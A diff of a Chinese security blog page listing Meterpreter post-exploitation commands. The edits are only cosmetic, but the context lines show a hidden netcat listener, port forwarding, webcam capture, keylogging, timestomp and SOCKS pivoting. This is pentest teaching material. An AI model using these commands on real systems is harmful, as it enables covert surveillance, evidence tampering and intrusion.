@@ -4,7 +4,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>MSF(二) meterpreter常用命令 | 狗剩儿</title>
 <meta name="description" content="小菜鸡。" />
-<link rel="shortcut icon" href="https://foolb.github.io//favicon.ico?v=1577109995160">
+<link rel="shortcut icon" href="https://foolb.github.io//favicon.ico?v=1577114072907">
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
 <link rel="stylesheet" href="https://foolb.github.io//styles/main.css">
@@ -20,7 +20,7 @@
       <div class="main-content">
         <div class="site-header">
   <a href="https://foolb.github.io/">
-  <img class="avatar" src="https://foolb.github.io//images/avatar.png?v=1577109995160" alt="">
+  <img class="avatar" src="https://foolb.github.io//images/avatar.png?v=1577114072907" alt="">
   </a>
   <h1 class="site-title">
     狗剩儿
@@ -178,7 +178,7 @@ execute -H -d notepad.exe -f nc.exe -a '-lvvp 3344'
 <h3 id="getpid">getpid</h3>
 <figure data-type="image" tabindex="12"><img src="https://foolb.github.io//post-images/image-20191216221819649.png" alt="image-20191216221819649"></figure>
 <h3 id="migrate-迁移进程">migrate # 迁移进程</h3>
-<pre><code class="language-cmd">ps # 查看当前主机的进程
+<pre><code class="language-bash">ps # 查看当前主机的进程
 </code></pre>
 <figure data-type="image" tabindex="13"><img src="https://foolb.github.io//post-images/image-20191214210746177.png" alt="image-20191214210746177"></figure>
 <p>迁移的话只能迁移到当前权限一样的进程，不能向高权限进程迁移。</p>
@@ -209,7 +209,7 @@ PPID（parent process ID）：PPID是程序的父进程号。
 <h3 id="shell">shell</h3>
 <h5 id="执行shell命令获取-windows-cmd-乱码">执行shell命令获取 Windows cmd 乱码</h5>
 <p>命令行执行</p>
-<pre><code class="language-cmd">chcp 65001
+<pre><code class="language-bash">chcp 65001
 </code></pre>
 <p>解决乱码问题</p>
 <figure data-type="image" tabindex="19"><img src="https://foolb.github.io//post-images/image-20191214221811102.png" alt="image-20191214221811102"></figure>
@@ -220,7 +220,9 @@ PPID（parent process ID）：PPID是程序的父进程号。
 <figure data-type="image" tabindex="22"><img src="https://foolb.github.io//post-images/image-20191216224633399.png" alt="image-20191216224633399"></figure>
 <h3 id="arp-netstat-ipconfig-ifconfig-route">arp / netstat / ipconfig / ifconfig / route</h3>
 <h3 id="portfwd">portfwd</h3>
-<pre><code>    -L &lt;opt&gt;要监听的本地主机（可选）
+<pre><code class="language-bash">OPTIONS:
+
+    -L &lt;opt&gt;要监听的本地主机（可选）
 
     -l &lt;opt&gt;要监听的本地端口
 
@@ -242,7 +244,6 @@ portfwd  add -l 4444 -p 3389 -r 192.168.1.102 # 端口转发,本机监听4444,�
 <pre><code class="language-bash">webcam_list # 列出所有摄像头
 webcam_snap -i 1 -v false # 每隔一秒钟拍一次照
 webcam_stream # 开启视频
-
 </code></pre>
 <h3 id="screenshot">screenshot</h3>
 <h3 id="keyscan_start-keyscan_dump-keyscan_stop-run-keylogrecorder">keyscan_start / keyscan_dump / keyscan_stop / run keylogrecorder</h3>
@@ -277,10 +278,9 @@ OPTIONS:
 <figure data-type="image" tabindex="28"><img src="https://foolb.github.io//post-images/image-20191223211046477.png" alt="image-20191223211046477"></figure>
 <figure data-type="image" tabindex="29"><img src="https://foolb.github.io//post-images/image-20191223211458078.png" alt="image-20191223211458078"></figure>
 <h3 id="timestomp">timestomp</h3>
-<pre><code>timestomp 1.txt -v
+<pre><code class="language-bash">timestomp 1.txt -v
 
 timestomp 1.txt -z &quot;08/22/2013 23:46:48&quot;
-
 </code></pre>
 <figure data-type="image" tabindex="30"><img src="https://foolb.github.io//post-images/image-20191223212517248.png" alt="image-20191223212517248"></figure>
 <figure data-type="image" tabindex="31"><img src="https://foolb.github.io//post-images/image-20191223212624874.png" alt="image-20191223212624874"></figure>
@@ -288,23 +288,21 @@ timestomp 1.txt -z &quot;08/22/2013 23:46:48&quot;
 <figure data-type="image" tabindex="32"><img src="https://foolb.github.io//post-images/image-20191216210519907.png" alt="image-20191216210519907"></figure>
 <figure data-type="image" tabindex="33"><img src="https://foolb.github.io//post-images/image-20191216210508606.png" alt="image-20191216210508606"></figure>
 <h3 id="socks代理">SOCKS代理</h3>
-<p>Metasploit可以作为一个SOCKS代理服务器，具体步骤为首先通过Metasploit的某些模块建立会话，就像本章前面介绍的，建立完会话之后，执行“route add +IP+mask+SID”，本例中我们路由的ip网段为10.1.1.0，然后使用“use auxiliary/server/socks4a”命令来使用sock4a模块，执行run命令 ，socks便会执行</p>
+<p>Metasploit可以作为一个SOCKS代理服务器，具体步骤为首先通过Metasploit的某些模块建立会话，就像本章前面介绍的，建立完会话之后，执行“route add +IP+mask+SID”，本例中我们路由的ip网段为10.1.1.0，然后使用“use auxiliary/server/socks4a”命令来使用sock4a模块，执行run命令 ，socks便会执行。</p>
 <p>然后再在命令行下执行proxychains命令，使用代理对目标主机进行扫描，nmap，nc等都可以。</p>
 <h2 id="meterpreter-python-扩展">meterpreter python 扩展</h2>
-<pre><code class="language-cmd">load python 
+<pre><code class="language-bash">load python 
 
 python_execute &quot;print('Hello,The\'s Meterpreter Python')&quot;
 
 python_execute &quot;import os; cd = os.getcwd()&quot; -r cd
 
 python_import -f xxx.py
-
 </code></pre>
 <figure data-type="image" tabindex="34"><img src="https://foolb.github.io//post-images/image-20191216232142321.png" alt="image-20191216232142321"></figure>
 <figure data-type="image" tabindex="35"><img src="https://foolb.github.io//post-images/image-20191216233220503.png" alt="image-20191216233220503"></figure>
 <h2 id="meterpreter-powershell-扩展">meterpreter powershell 扩展</h2>
-<pre><code>load powershell
-
+<pre><code class="language-bash">load powershell
 </code></pre>
 <figure data-type="image" tabindex="36"><img src="https://foolb.github.io//post-images/image-20191216232544039.png" alt="image-20191216232544039"></figure>
 <h2 id="参考链接">参考链接</h2>
